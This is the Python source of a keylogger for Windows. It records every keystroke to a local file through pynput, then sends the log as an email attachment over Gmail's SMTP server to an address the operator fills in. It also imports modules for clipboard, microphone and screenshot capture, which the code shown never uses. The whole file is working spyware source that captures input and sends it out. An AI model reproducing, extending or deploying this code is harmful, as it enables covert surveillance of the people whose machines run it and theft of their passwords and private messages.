from email.mime.multipart import MIMEMultipart #for emails
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtpd
import smtplib


import socket #for Sockets and networking
import platform

import win32clipboard #logging/listening
from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write #for microhone
import sounddevice as sd

from cryptography.fernet import Fernet #for encryption

import getpass
from requests import get #for HTTP

from multiprocessing import Process, freeze_support
from PIL import ImageGrab #get screenshots

keyInfo = "filename"
filePath = "filepath"
extend = "\\"

count = 0
keys = []

#Credentials
"""Add your credentials here for emailID, emailPassword and toAddr"""

# #Email Functionality
def sendEmail(filename, attachment, toAddr):
    fromAddr = emailID
    msg = MIMEMultipart()
    msg['From'] = fromAddr
    msg['To'] = toAddr
    msg['Subject'] = "Log File"
    body = "Body of the Mail"
    
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromAddr, emailPassword)

    text = msg.as_string()

    s.sendmail(fromAddr, toAddr, text)
    s.quit()

sendEmail(keyInfo, filePath + extend + keyInfo, toAddr)


#Key Logging
def onPress(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        writeFile(keys)
        keys = []


def writeFile(keys):
    with open(filePath + extend + keyInfo, "a") as logFile:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                logFile.write('\n')
                logFile.close()

            elif k.find("Key") == -1:
                logFile.write(k)
                logFile.close()                


def onRelease(key):
    if key == Key.esc:
        return False


with Listener(on_press=onPress, on_release=onRelease) as listener:
    listener.join()

